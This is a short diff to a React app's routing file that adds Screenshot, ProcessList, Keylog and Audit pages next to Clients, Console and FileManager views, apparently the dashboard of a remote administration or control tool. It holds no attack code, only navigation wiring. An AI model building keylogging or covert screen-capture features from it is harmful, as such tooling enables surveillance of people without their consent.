@@ -7,6 +7,10 @@ import Clients from './components/Clients';
 import SessionHistory from './components/SessionHistory';
 import Console from './components/Console';
 import FileManager from './components/FileManager';
+import Screenshot from './components/Screenshot';
+import ProcessList from './components/ProcessList';
+import Keylog from './components/Keylog';
+import { Audit } from './components';
 import Settings from './components/Settings';
 import { WaveBackground } from './components/WaveBackground';
 
@@ -75,6 +79,10 @@ const App: React.FC = () => {
             <Route path="clients" element={<Clients />} />
             <Route path="history" element={<SessionHistory />} />
             <Route path="console" element={<Console />} />
+            <Route path="screenshot" element={<Screenshot />} />
+            <Route path="processes" element={<ProcessList />} />
+            <Route path="keylog" element={<Keylog />} />
+            <Route path="audit" element={<Audit />} />
             <Route path="files" element={<FileManager />} />
             <Route path="settings" element={<Settings />} />
           </Route>
